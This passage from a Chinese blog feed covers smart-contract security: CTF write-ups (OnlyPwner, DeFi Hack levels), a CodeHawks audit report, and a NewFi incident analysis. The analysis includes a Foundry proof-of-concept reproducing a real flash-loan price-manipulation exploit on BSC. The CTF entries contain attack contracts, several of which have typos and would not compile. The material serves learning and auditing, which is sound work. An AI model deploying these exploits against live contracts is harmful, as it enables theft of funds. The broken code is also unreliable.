1000</span><br><span class="line">  Hacker2 balance : 0</span><br><span class="line">  GOATFinance balance : 199999999000</span><br><span class="line">  Hacker balance after : 480</span><br><span class="line">  Hacker2 balance after : 9980000000</span><br><span class="line">  GOATFinance balance after : 190019999001</span><br><span class="line"></span><br><span class="line">Test result: ok. 1 passed; 0 failed; finished in 1.51ms</span><br></pre></td></tr></table></figure><p>这个题第一次遇到，真的很值得学习，这种只要满足题目要求的调用者都可以。</p>]]></content>
      
      
      
        <tags>
            
            <tag> CTF </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>CTF-OnlyPwner-FREEBIE</title>
      <link href="/2024/11/11/CTF-OnlyPwner-FREEBIE/"/>
      <url>/2024/11/11/CTF-OnlyPwner-FREEBIE/</url>
      
        <content type="html"><![CDATA[<h1 id="CTF-OnlyPwner-FREEBIE"><a href="#CTF-OnlyPwner-FREEBIE" class="headerlink" title="CTF-OnlyPwner-FREEBIE"></a>CTF-OnlyPwner-FREEBIE</h1><p>题目地址 <a href="https://onlypwner.xyz/challenges/5">点击</a></p><p>要求是将合约的余额变为零</p><p>源代码很少</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">pragma solidity 0.8.19;</span><br><span class="line"></span><br><span class="line">import &#123;IVault&#125; from &quot;./interfaces/IVault.sol&quot;;</span><br><span class="line"></span><br><span class="line">contract Vault is IVault &#123;</span><br><span class="line">    uint256 public totalDeposited;</span><br><span class="line"></span><br><span class="line">    function deposit() external payable &#123;</span><br><span class="line">        totalDeposited += msg.value;</span><br><span class="line">        emit Deposit(msg.sender, msg.value);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    function withdraw(uint256 amount) external &#123;</span><br><span class="line">        totalDeposited -= amount;</span><br><span class="line">        payable(msg.sender).transfer(amount);</span><br><span class="line">        emit Withdraw(msg.sender, amount);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>一看就是一个重入攻击</p><p>很简单，所以就直接写攻击合约了,就没有在remix上部署了</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">//SPDX-License-Identifier: MIT</span><br><span class="line">pragma solidity^0.8.19;</span><br><span class="line"></span><br><span class="line">interface Vault&#123;</span><br><span class="line">    function deposit() external payable;</span><br><span class="line">    function withdraw(uint256 amount ) exteranl;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">contract Hack&#123;</span><br><span class="line">   Vault target;</span><br><span class="line"></span><br><span class="line">    constructor (address _target)&#123;</span><br><span class="line">        target = Vault(_target);</span><br><span class="line">    &#125;</span><br><span class="line">    </span><br><span class="line">    function pwn() external payable &#123;</span><br><span class="line">        target.withdraw(1 ether);</span><br><span class="line">    &#125;</span><br><span class="line">    receive() external payable &#123;</span><br><span class="line"></span><br><span class="line">     if(balanceOf(address(Vault))&gt;balanceOf(address(this)))</span><br><span class="line">        target.withdraw(1 ether);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>]]></content>
      
      
      
        <tags>
            
            <tag> CTF </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>CodeHawks-GivingThanks审计报告</title>
      <link href="/2024/11/11/CodeHawks-GivingThanks%E5%AE%A1%E8%AE%A1%E6%8A%A5%E5%91%8A/"/>
      <url>/2024/11/11/CodeHawks-GivingThanks%E5%AE%A1%E8%AE%A1%E6%8A%A5%E5%91%8A/</url>
      
        <content type="html"><![CDATA[<h1 id="一"><a href="#一" class="headerlink" title="一"></a>一</h1><h2 id="Summary"><a href="#Summary" class="headerlink" title="Summary"></a>Summary</h2><p>The attacker can register their own address as the charitable organization and then perform a self-transfer by donating to the organization, effectively receiving a specific minted NFT for free.</p><h2 id="Vulnerability-Details"><a href="#Vulnerability-Details" class="headerlink" title="Vulnerability Details"></a>Vulnerability Details</h2><p>Vulnerability code source:<br><a href="https://github.com/Cyfrin/2024-11-giving-thanks/blob/304812abfc16df934249ecd4cd8dea38568a625d/src/GivingThanks.sol#L21-L23">https://github.com/Cyfrin/2024-11-giving-thanks/blob/304812abfc16df934249ecd4cd8dea38568a625d/src/GivingThanks.sol#L21-L23</a></p><p>There is no check to verify whether the charitable organization’s address is the same as the donor’s address, which allows attackers to mint specific NFTs for free. In other words, the registration requirements for a charitable organization are too lenient — only the admin’s approval is needed. This creates a situation where an attacker can effectively perform a self-transfer, resulting in the acquisition of more NFTs.</p><h2 id="Impact"><a href="#Impact" class="headerlink" title="Impact"></a>Impact</h2><p>The attacker can disguise their own address as a charitable organization, obtain the admin’s confirmation, and then call the donate function, passing their own address as the charitable organization’s address. This allows the attacker to donate tokens and receive a specific NFT. If the attacker repeats the donation multiple times, it will lead to the minting of many NFTs, resulting in resource wastage and potentially the destruction of NFTs. If possible, the attacker may also sell the NFTs, gaining illegal profits.If this vulnerability is exploited by an attacker, it would undermine the reward mechanism for donors, allowing malicious individuals who haven’t donated to also receive specific NFTs.</p><h2 id="Tools-Used"><a href="#Tools-Used" class="headerlink" title="Tools Used"></a>Tools Used</h2><p>Manual review.</p><h2 id="Recommendations"><a href="#Recommendations" class="headerlink" title="Recommendations"></a>Recommendations</h2><p>Add a require condition to check if the charitable organization’s address is the same as the donor’s address. If they are the same, prevent the donation from being processed.</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">function donate(address charity) public payable &#123;</span><br><span class="line">        require(registry.isVerified(charity), &quot;Charity not verified&quot;);</span><br><span class="line"></span><br><span class="line">       require(msg.sender == charity,&quot;Not the correct charitable organization“）</span><br><span class="line"></span><br><span class="line">        (bool sent,) = charity.call&#123;value: msg.value&#125;(&quot;&quot;);</span><br><span class="line">        require(sent, &quot;Failed to send Ether&quot;);</span><br><span class="line"></span><br><span class="line">        _mint(msg.sender, tokenCounter);</span><br><span class="line">//...</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h1 id="二"><a href="#二" class="headerlink" title="二"></a>二</h1><h2 id="Summary-1"><a href="#Summary-1" class="headerlink" title="Summary"></a>Summary</h2><p>Anyone can modify the registry, leading to a shift in power, which could allow attackers to freely register charitable organizations.</p><h2 id="Vulnerability-Details-1"><a href="#Vulnerability-Details-1" class="headerlink" title="Vulnerability Details"></a>Vulnerability Details</h2><p>The source of the vulnerability code:<br><a href="https://github.com/Cyfrin/2024-11-giving-thanks/blob/304812abfc16df934249ecd4cd8dea38568a625d/src/GivingThanks.sol#L56-L58">https://github.com/Cyfrin/2024-11-giving-thanks/blob/304812abfc16df934249ecd4cd8dea38568a625d/src/GivingThanks.sol#L56-L58</a></p><p>Detailed vulnerability code.</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">function updateRegistry(address _registry) public &#123;</span><br><span class="line">       registry = CharityRegistry(_registry);</span><br><span class="line">   &#125;</span><br></pre></td></tr></table></figure><p>This function is public, meaning anyone can modify the registry. In other words, an attacker could register themselves as the registry and then provide the address of a charitable organization to register it. Only the admin is supposed to confirm the registration, but since the attacker has now become the admin, this creates a vulnerability that could be exploited for uncontrollable attacks.</p><h2 id="Impact-1"><a href="#Impact-1" class="headerlink" title="Impact"></a>Impact</h2><p>An attacker can call the <code>updateRegistry</code> public function, passing their own address as a parameter to change the registry. Then, by calling the donate function again, the attacker could either pass their own address or another address, allowing them to illegally receive donated tokens and engage in malicious fundraising.</p><h2 id="Tools-Used-1"><a href="#Tools-Used-1" class="headerlink" title="Tools Used"></a>Tools Used</h2><p>Manual review.</p><h2 id="Recommendations-1"><a href="#Recommendations-1" class="headerlink" title="Recommendations"></a>Recommendations</h2><p>Add a require condition in the<code>updateRegistry</code>function to restrict who can modify the registry.</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">function updateRegistry(address _registry) public &#123;</span><br><span class="line">      require(msg.sender == owner, &quot;NOT TURE ADMIN&quot;</span><br><span class="line">       registry = CharityRegistry(_registry);</span><br><span class="line">   &#125;</span><br></pre></td></tr></table></figure><h1 id="这次的报告，只有第一个被视为有效，还需要学习"><a href="#这次的报告，只有第一个被视为有效，还需要学习" class="headerlink" title="这次的报告，只有第一个被视为有效，还需要学习"></a>这次的报告，只有第一个被视为有效，还需要学习</h1>]]></content>
      
      
      
        <tags>
            
            <tag> 审计报告 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>newfi攻击事件的分析</title>
      <link href="/2024/11/09/newfi%E6%94%BB%E5%87%BB%E4%BA%8B%E4%BB%B6%E7%9A%84%E5%88%86%E6%9E%90/"/>
      <url>/2024/11/09/newfi%E6%94%BB%E5%87%BB%E4%BA%8B%E4%BB%B6%E7%9A%84%E5%88%86%E6%9E%90/</url>
      
        <content type="html"><![CDATA[<p>攻击介绍<br>2023年7月17日，bscscan链上的NewFi被黑客攻击，一共损失了价值31k$的BUSD。</p><p>攻击分析<br>我们使用phalcon进行分析，通过phalcon的调用栈分析，可以看到攻击者首先从4个池子贷了大量的BUSD，然后在PancakeSwap: Smart Router V3中通过以质押与回收BUSD从中套了31,099的BUSD。分析StakedV3.Invest()的调用栈，发现sqrtPriceX96从456917351256涨到了396517633895，显然攻击者通过StakedV3的Invest()方法操纵了价格。</p><p>POC</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">// SPDX-License-Identifier: UNLICENSED</span><br><span class="line">pragma solidity ^0.8.10;</span><br><span class="line"></span><br><span class="line">import &quot;forge-std/Test.sol&quot;;</span><br><span class="line">import &quot;./interface.sol&quot;;</span><br><span class="line"></span><br><span class="line">// Vulnerable Contract : 0xb8dc09eec82cab2e86c7edc8dd5882dd92d22411</span><br><span class="line">// Attack Tx : 0x557628123d137ea49564e4dccff5f5d1e508607e96dd20fe99a670519b679cb5</span><br><span class="line"></span><br><span class="line">interface IStakedV3 &#123;</span><br><span class="line">    function Invest(</span><br><span class="line">        uint256 id,</span><br><span class="line">        uint256 amount,</span><br><span class="line">        uint256 quoteAmount,</span><br><span class="line">        uint256 investType,</span><br><span class="line">        uint256 cycle,</span><br><span class="line">        uint256 deadline</span><br><span class="line">    ) external payable;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">contract ContractTest is Test &#123;</span><br><span class="line">    IERC20 BUSD = IERC20(0xe9e7CEA3DedcA5984780Bafc599bD69ADd087D56);</span><br><span class="line">    IERC20 USDT = IERC20(0x55d398326f99059fF775485246999027B3197955);</span><br><span class="line">    Uni_Router_V3 Router = Uni_Router_V3(0x13f4EA83D0bd40E75C8222255bc855a974568Dd4);</span><br><span class="line">    Uni_Pair_V3 Pair1 = Uni_Pair_V3(0x22536030B9cE783B6Ddfb9a39ac7F439f568E5e6);</span><br><span class="line">    Uni_Pair_V3 Pair2 = Uni_Pair_V3(0x85FAac652b707FDf6907EF726751087F9E0b6687);</span><br><span class="line">    Uni_Pair_V3 Pair3 = Uni_Pair_V3(0x369482C78baD380a036cAB827fE677C1903d1523);</span><br><span class="line">    IStakedV3 StakedV3 = IStakedV3(0xB8dC09Eec82CaB2E86C7EdC8DD5882dd92d22411);</span><br><span class="line"></span><br><span class="line">    function setUp() public &#123;</span><br><span class="line">        vm.createSelectFork(&quot;bsc&quot;, 30_043_573);</span><br><span class="line">        vm.label(address(BUSD), &quot;BUSD&quot;);</span><br><span class="line">        vm.label(address(USDT), &quot;USDT&quot;);</span><br><span class="line">        vm.label(address(Router), &quot;Router&quot;);</span><br><span class="line">        vm.label(address(Pair1), &quot;Pair1&quot;);</span><br><span class="line">        vm.label(address(Pair2), &quot;Pair2&quot;);</span><br><span class="line">        vm.label(address(StakedV3), &quot;StakedV3&quot;);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    function testExploit() public &#123;</span><br><span class="line">        USDT.approve(address(Router), type(uint256).max);</span><br><span class="line">        BUSD.approve(address(Router), type(uint256).max);</span><br><span class="line">        BUSD.approve(address(StakedV3), type(uint256).max);</span><br><span class="line">        BUSD.approve(address(StakedV3), type(uint256).max);</span><br><span class="line">        Pair1.flash(address(this), 0, BUSD.balanceOf(address(Pair1)), abi.encode(BUSD.balanceOf(address(Pair1))));</span><br><span class="line"></span><br><span class="line">        emit log_named_decimal_uint(</span><br><span class="line">            &quot;Attacker BUSD balance after exploit&quot;, BUSD.balanceOf(address(this)), BUSD.decimals()</span><br><span class="line">            );</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    function pancakeV3FlashCallback(uint256 amount0, uint256 amount1, bytes calldata data) external &#123;</span><br><span class="line">        if (msg.sender == address(Pair1)) &#123;</span><br><span class="line">            Pair2.flash(address(this), 0, BUSD.balanceOf(address(Pair2)), abi.encode(BUSD.balanceOf(address(Pair2))));</span><br><span class="line">            uint256 repayAmount = abi.decode(data, (uint256));</span><br><span class="line">            BUSD.transfer(address(Pair1), repayAmount + amount1);</span><br><span class="line">        &#125; else if (msg.sender == address(Pair2)) &#123;</span><br><span class="line">            Pair3.flash(address(this), 0, BUSD.balanceOf(address(Pair3)), abi.encode(BUSD.balanceOf(address(Pair3))));</span><br><span class="line">            uint256 repayAmount = abi.decode(data, (uint256));</span><br><span class="line">            BUSD.transfer(address(Pair2), repayAmount + amount1);</span><br><span class="line">        &#125; else if (msg.sender == address(Pair3)) &#123;</span><br><span class="line">            BUSDToUSDT();</span><br><span class="line">            StakedV3.Invest(2, 1 ether, 2, 1, 7, block.timestamp + 1000); // remove liquidity and swap BUSD to USDT</span><br><span class="line">            USDTToBUSD();</span><br><span class="line">            uint256 repayAmount = abi.decode(data, (uint256));</span><br><span class="line">            BUSD.transfer(address(Pair3), repayAmount + amount1);</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    function BUSDToUSDT() internal &#123;</span><br><span class="line">        bytes memory path = abi.encodePacked(address(BUSD), uint24(100), address(USDT));</span><br><span class="line">        address recipient = address(this);</span><br><span class="line">        uint256 amountIn = 12_000_000 ether;</span><br><span class="line">        uint256 amountOutMinimum = 0;</span><br><span class="line">        Uni_Router_V3.ExactInputParams memory ExactInputParams =</span><br><span class="line">            Uni_Router_V3.ExactInputParams(path, recipient, amountIn, amountOutMinimum);</span><br><span class="line">        Router.exactInput(ExactInputParams);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    function USDTToBUSD() internal &#123;</span><br><span class="line">        bytes memory path = abi.encodePacked(address(USDT), uint24(100), address(BUSD));</span><br><span class="line">        address recipient = address(this);</span><br><span class="line">        uint256 amountIn = USDT.balanceOf(address(this));</span><br><span class="line">        uint256 amountOutMinimum = 0;</span><br><span class="line">        Uni_Router_V3.ExactInputParams memory ExactInputParams =</span><br><span class="line">            Uni_Router_V3.ExactInputParams(path, recipient, amountIn, amountOutMinimum);</span><br><span class="line">        Router.exactInput(ExactInputParams);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>]]></content>
      
      
      
        <tags>
            
            <tag> 攻击事件分析 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>CTF-DeFi Hack</title>
      <link href="/2024/11/04/CTF-DeFi-Hack/"/>
      <url>/2024/11/04/CTF-DeFi-Hack/</url>
      
        <content type="html"><![CDATA[<h1 id="DeFi-Hack"><a href="#DeFi-Hack" class="headerlink" title="DeFi Hack"></a>DeFi Hack</h1><p>由于这个是一个题目集，就写在一起，做个写题记录<br>五个题目的源代码，都在这里了：<br>源代码：<a href="https://www.defihack.xyz/level/0xB761C26d6Ade3Da1c6a4313C785b76B90cae702e">点击</a></p><h2 id="May-The-Force-Be-With-You"><a href="#May-The-Force-Be-With-You" class="headerlink" title="May The Force Be With You"></a>May The Force Be With You</h2><p>题目要求是：要取得合约中所有的代币</p><p>首先还是看代码，合约代码，还是简单，重点还是看向withdrew函数，要撤回合约中的所有代币，</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">function withdraw(uint256 numberOfShares) external nonReentrant &#123;</span><br><span class="line">       // Gets the amount of xYODA in existence</span><br><span class="line">       uint256 totalShares = totalSupply();</span><br><span class="line">       // Calculates the amount of YODA the xYODA is worth</span><br><span class="line">       uint256 what =</span><br><span class="line">           numberOfShares.mul(yoda.balanceOf(address(this))).div(totalShares);</span><br><span class="line">       _burn(msg.sender, numberOfShares);</span><br><span class="line">       yoda.transfer(msg.sender, what);</span><br><span class="line"></span><br><span class="line">       emit Withdraw(msg.sender, what);</span><br><span class="line">   &#125;</span><br></pre></td></tr></table></figure><p>有个tranfer函数，</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">function transfer(address _to, uint256 _amount) public returns (bool success) &#123;</span><br><span class="line">       return doTransfer(msg.sender, _to, _amount);</span><br><span class="line">   &#125;</span><br></pre></td></tr></table></figure><p>又是一个doTransfer函数</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">function doTransfer(address _from, address _to, uint _amount) internal returns(bool) &#123;</span><br><span class="line">       if (_amount == 0) &#123;</span><br><span class="line">           return true;</span><br><span class="line">       &#125;</span><br><span class="line">       // Do not allow transfer to 0x0 or the token contract itself</span><br><span class="line">       require((_to != address(0)) &amp;&amp; (_to != address(this)));</span><br><span class="line">       // If the amount being transfered is more than the balance of the</span><br><span class="line">       //  account the transfer returns false</span><br><span class="line">       if (balances[_from] &lt; _amount) &#123;</span><br><span class="line">           return false;</span><br><span class="line">       &#125;</span><br><span class="line"></span><br><span class="line">       // First update the balance array with the new value for the address</span><br><span class="line">       //  sending the tokens</span><br><span class="line">       balances[_from] = balances[_from] - _amount;</span><br><span class="line">       // Then update the balance array with the new value for the address</span><br><span class="line">       //  receiving the tokens</span><br><span class="line"></span><br><span class="line">       require(balances[_to] + _amount &gt;= balances[_to]); // Check for overflow</span><br><span class="line">       balances[_to] = balances[_to] + _amount;</span><br><span class="line">       // An event to make the transfer easy to find on the blockchain</span><br><span class="line">       Transfer(_from, _to, _amount);</span><br><span class="line">       return true;</span><br><span class="line">   &#125;</span><br></pre></td></tr></table></figure><p>一路看下来，我并没有看见什么地方漏洞，那么又去看看<code>deposit</code>的函数，能不能免费给我们<code>mint</code>代币，果然发现了蹊跷，<code>deposit</code>函数中也存在<code>dotransfer</code>函数，而且它和<code>transferfrom</code>函数的表达上还有些歧义，如果<code>dotransfer</code>函数中，由于<code>aomunt</code>值太大，会导致<code>deposit</code>函数中的<code>transferFrom</code>函数直接返回<code>flase</code>,那么就意味着我们给合约转账失败，换句话来说就是我们可以免费获得x代币，然后再调用withdrew函数，就能获得大量的代币，把合约掏空。</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">if (balances[_from] &lt; _amount) &#123;</span><br><span class="line">            return false;</span><br><span class="line">        &#125;</span><br></pre></td></tr></table></figure><p>攻击思路；首先调用deposit函数，存入数量很大的amount，让合约给我们免费mint x代币。然后再调用withdrew函数，就能获得合约中的所有代币了。</p><p>总的来说这个题，就是要要看好使用的哪些函数，而且他们的返回值都是bool类型的，然后再继续的找漏洞，理清合约的逻辑,敢于想象</p><h2 id="DiscoLP"><a href="#DiscoLP" class="headerlink" title="DiscoLP"></a>DiscoLP</h2><p>题目要求是：<br>DiscoLP 是一个全新的流动性挖矿协议！您可以通过存入一些 JIMBO 或 JAMBO 代币来参与。所有流动性将提供给 JIMBO-JAMBO Uniswap 对。通过向我们提供流动性，您将获得 DISCO 代币作为回报！</p><p>您有 1 个 JIMBO 和 1 个 JAMBO，您能获得至少 100 个 DISCO 代币吗？</p><p>看向合约代码，只有一个主函数，depositToken,检查它有没有token的计算错误，<br>发现都是正常的，但是漏了一点</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">function _joinPool(address _pair, address _token, uint256 _amount, uint256 _minShares) internal returns (uint256 _shares)</span><br><span class="line"> &#123;</span><br><span class="line">   if (_amount == 0) return 0;</span><br><span class="line">   address _router = $.UniswapV2_ROUTER02;</span><br><span class="line">   address _token0 = Pair(_pair).token0();</span><br><span class="line">   address _token1 = Pair(_pair).token1();</span><br><span class="line">   address _otherToken = _token == _token0 ? _token1 : _token0;</span><br><span class="line">   (uint256 _reserve0, uint256 _reserve1,) = Pair(_pair).getReserves();</span><br><span class="line">   uint256 _swapAmount = _calcSwapOutputFromInput(_token == _token0 ? _reserve0 : _reserve1, _amount);</span><br><span class="line">   if (_swapAmount == 0) _swapAmount = _amount / 2;</span><br><span class="line">   uint256 _leftAmount = _amount.sub(_swapAmount);</span><br><span class="line">   _approveFunds(_token, _router, _amount);</span><br><span class="line">   address[] memory _path = new address[](2);</span><br><span class="line">   _path[0] = _token;</span><br><span class="line">   _path[1] = _otherToken;</span><br><span class="line">   uint256 _otherAmount = Router02(_router).swapExactTokensForTokens(_swapAmount, 1, _path, address(this), uint256(-1))[1];</span><br><span class="line">   _approveFunds(_otherToken, _router, _otherAmount);</span><br><span class="line">   (,,_shares) = Router02(_router).addLiquidity(_token, _otherToken, _leftAmount, _otherAmount, 1, 1, address(this), uint256(-1));</span><br><span class="line">   require(_shares &gt;= _minShares, &quot;high slippage&quot;);</span><br><span class="line">   return _shares;</span><br><span class="line"> &#125;</span><br></pre></td></tr></table></figure><p>在主函数中，调用_joinPool函数时，没有对token的来源进行检查，也就是说，只要pair对随意俩个token，就能mint DISCO<br>我们可以自己创造一个pair,然后赋值大量的token，给原本的流动性池提供该token。这样就能获得奖励的lp币</p><p>Uniswap 的设计方式是必须以相同比例存入一对代币，但此功能允许质押单个代币，将价值的一半换成第二个代币。作为回报，授予了 LP 股票。</p><p> depositToken函数不仅限于 JIMBO 或 JAMBO 令牌，而是实际上接受任何令牌，没有对参数进行验证。这意味着几乎可以质押任何代币，从而可以凭空铸造 DISCO。虽然原因很简单，但攻击执行需要多个步骤。</p><p>攻击合约：</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">//SPDX-License-Identifier:MIT </span><br><span class="line">pragma solidity^0.8.13;</span><br><span class="line"></span><br><span class="line">import &quot;@openzeppelin/contracts/token/ERC20/ERC20.sol&quot;;</span><br><span class="line"></span><br><span class="line">interface UniswapV2Factory&#123;</span><br><span class="line">    function createpair(address token0,address token1) externals return (address pair);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">interface UniswapV2Router &#123;</span><br><span class="line">   function addLiquidity(address _tokenA, address _tokenB, uint256 _amountADesired, uint256 _amountBDesired, uint256 _amountAMin, uint256 _amountBMin, address _to, uint256 _deadline) external returns (uint256 _amountA, uint256 _amountB, uint256 _liquidity);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">interface Discolp&#123;</span><br><span class="line">    function depositToken(address _token,uint256 _amount,uint256 _minShares) external;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">contract Token is ERC20 &#123;</span><br><span class="line">    constructor(string memory _name, string memory _symbol) ERC20(_name, _symbol) public &#123;</span><br><span class="line">        _mint(msg.sender, 2**256 - 1);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">contract Hack &#123;</span><br><span class="line">    UniswapV2Factory factory;</span><br><span class="line">    UniswapV2Router router;</span><br><span class="line">    Discolp discolp;</span><br><span class="line">    uint256 balance;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">    constructor (address _factory,address _router,address _discolp)&#123;</span><br><span class="line">        factory = UniswapV2Factory (_factory);</span><br><span class="line">        router = UniswapV2Router (_router);</span><br><span class="line">        discolp = Discolp (_discolp);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    function pwn() exteranl&#123;</span><br><span class="line">    Token usdc =new Token(&quot;USDC token&quot;,&quot;USDC&quot;);</span><br><span class="line">    usdc.approve(factory,2^256-1);</span><br><span class="line">    usdc.approve(router,2^256-1);</span><br><span class="line">    //创建tokenA(JIMBO代币)，保证后续swap操作得以通过</span><br><span class="line">    ERC20(tokenA).approve(router,2^256-1);</span><br><span class="line"></span><br><span class="line">    //创建JIMBO-usdc对</span><br><span class="line">    address pair = factory.create(address (usdc),address(tokenA));</span><br><span class="line"></span><br><span class="line">    //添加流动性</span><br><span class="line">      (uint256 amountA, uint256 amountB, uint256 _shares) = IUniswapV2Router(_router).addLiquidity(</span><br><span class="line">          address(usdc),</span><br><span class="line">          address(tokenA),</span><br><span class="line">          100000000000 * 10 ** 18, //增加流动性usdc的数量</span><br><span class="line">          1 * 10 ** 18,//增加流动性JIMBO数量</span><br><span class="line">          1, 1, </span><br><span class="line">          address(this),//接受lp的地址，合约本身。</span><br><span class="line">           2**256 - 1);</span><br><span class="line">        DiscoLP(instance).depositToken(address(evil), amount, 1);</span><br><span class="line"></span><br><span class="line">        uint256 balance = discolp.balanceOf(address(this));</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>这就是以上的攻击代码，总结以下，关于流动性的题，首先要看，token的计算，再看逻辑，然后一些检查条件，是否可以再次创建pair,进行套利。</p><h2 id="P2PSwapper"><a href="#P2PSwapper" class="headerlink" title="P2PSwapper"></a>P2PSwapper</h2><p>题目要求：<br>P2PSwapper 是一款适用于任何资产的超级方便的零信任 P2P DEX！ 费用是固定的，所以欢迎鲸鱼！ 此外，我们还有一个推荐计划，所有费用都在我们和主要所有者之间平均分配。</p><p>我们创建了一个样本交易并为此存入了一些资金。我们希望确保您无法提取分配给我们交易的费用。</p><p>您必须从 P2PSwapper 的余额中耗尽所有 WETH 代币。</p><p>看向主要的P2P_WETH合约，其实漏洞就遇到过几次了，<br>这是库合约中的函数</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">function safeTransferFrom(</span><br><span class="line">        address token,</span><br><span class="line">        address from,</span><br><span class="line">        address to,</span><br><span class="line">        uint256 value</span><br><span class="line">    ) internal &#123;</span><br><span class="line">        // bytes4(keccak256(bytes(&#x27;transferFrom(address,address,uint256)&#x27;)));</span><br><span class="line">        (bool success, bytes memory data) = token.call(abi.encodeWithSelector(0x23b872dd, from, to, value));</span><br><span class="line">        require(</span><br><span class="line">            success &amp;&amp; (data.length == 0 || abi.decode(data, (bool))),</span><br><span class="line">            &#x27;TransferHelper::transferFrom: transferFrom failed&#x27;</span><br><span class="line">        );</span><br><span class="line">    &#125;</span><br></pre></td></tr></table></figure><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">function safeTransfer(</span><br><span class="line">       address token,</span><br><span class="line">       address to,</span><br><span class="line">       uint256 value</span><br><span class="line">   ) internal &#123;</span><br><span class="line">       // bytes4(keccak256(bytes(&#x27;transfer(address,uint256)&#x27;)));</span><br><span class="line">       (bool success, bytes memory data) = token.call(abi.encodeWithSelector(0xa9059cbb, to, value));</span><br><span class="line">       require(</span><br><span class="line">           success &amp;&amp; (data.length == 0 || abi.decode(data, (bool))),</span><br><span class="line">           &#x27;TransferHelper::safeTransfer: transfer failed&#x27;</span><br><span class="line">       );</span><br><span class="line">   &#125;</span><br></pre></td></tr></table></figure><p>和之前的一样，就是外部调用，没有进行对token地址的检查，所以可以自己编写一个攻击合约，就是一个token合约,可以进行攻击</p><h2 id="FakerDAO"><a href="#FakerDAO" class="headerlink" title="FakerDAO"></a>FakerDAO</h2><p>由于已经关网了，这个题要合约实例才能写，个人理解</p><h2 id="Main-Khinkal-Chef"><a href="#Main-Khinkal-Chef" class="headerlink" title="Main Khinkal Chef"></a>Main Khinkal Chef</h2><p>题目要求，还是要消耗合约中所有代币</p><p>这个合约，就是前期有点难看懂，其实就是实现了一个流动性池的的奖励机制</p><p>漏洞就在于这个函数</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">// Update governance address by the governance.</span><br><span class="line">  function setGovernance(</span><br><span class="line">      address _governance</span><br><span class="line">  ) public &#123;</span><br><span class="line">      require(msg.sender == owner() || msg.sender == _governance, &quot;Access denied&quot;);</span><br><span class="line">      governance = _governance;</span><br><span class="line">  &#125;</span><br></pre></td></tr></table></figure><p>由于传递了参数，这个governance我们就可以改动，一旦成为了，管理员，那么我们就可以自己创建一个流动性池，然后利用自己合约是个代币合约，给原合约转入很多代币，以便后面消除它</p><p>攻击合约</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">//SPDX-Lincense-Identifier:MIT</span><br><span class="line">pragma solidity ^0.8.12;</span><br><span class="line"></span><br><span class="line">import &quot;../levels/MainChef.sol&quot;;</span><br><span class="line"></span><br><span class="line">contract MainChefAttack &#123;</span><br><span class="line">    uint pwned;</span><br><span class="line">    uint tradeId;</span><br><span class="line">    MainChef target;</span><br><span class="line"></span><br><span class="line">    constructor(MainChef _target) public &#123;</span><br><span class="line">        target = _target;</span><br><span class="line">        pwned = 0;</span><br><span class="line">    &#125;</span><br><span class="line">//前期准备工作</span><br><span class="line">    function prepare() public &#123;</span><br><span class="line">        /先成为governance</span><br><span class="line">        target.setGovernance(address(this));</span><br><span class="line">        //将自己合约作为一个新的lp代币，添加到流动池中</span><br><span class="line">        target.addToken(IERC20(address(this)));</span><br><span class="line">        </span><br><span class="line">        target.deposit(1, 500010319375738048); // (31333333337 + 313337) / 2 * 1e12 / 31333</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    function hack() public &#123;</span><br><span class="line">        target.withdraw(1);</span><br><span class="line">    &#125;</span><br><span class="line">    //为了满足原合约对lp代币的一些require，（也就是绕过某些条件）</span><br><span class="line">    function transferFrom(address sender, address recipient, uint256 amount) public virtual returns (bool) &#123;</span><br><span class="line">        return true;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    function balanceOf(address a) external returns (uint) &#123;</span><br><span class="line">        return 1e18;</span><br><span class="line">    &#125;</span><br><span class="line">//做一个检查，是否转账成功了</span><br><span class="line">    function transfer(address recipient, uint256 amount) public virtual returns (bool) &#123;</span><br><span class="line">      if(pwned != 0) return true;</span><br><span class="line">      pwned += 1;</span><br><span class="line">      target.withdraw(1);</span><br><span 